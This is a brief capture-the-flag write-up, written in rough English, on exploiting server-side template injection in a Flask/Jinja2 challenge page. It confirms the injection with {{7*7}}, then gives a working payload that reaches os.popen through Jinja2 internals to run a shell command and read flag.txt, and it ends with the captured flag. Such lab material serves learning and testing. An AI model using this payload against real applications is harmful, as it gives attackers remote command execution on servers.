@@ -1,0 +1,20 @@
+open home page its view source code its flask jinja2 
+
+jinja2 have a templete injection vulnerble 
+
+look the code /page?name=hello
+
+its reflact on response 
+
+now check some templete injection test 
+{{7*7}}
+
+its reponse is 49 
+
+so its woriking templete injection 
+
+now execute command injection to the exploit code here
+{{ self._TemplateReference__context.cycler.__init__.__globals__.os.popen('cat flag.txt').read() }}
+
+
+now got a flag: WBCOECTF{S4T!_T1M&t_iNJ45Nj}
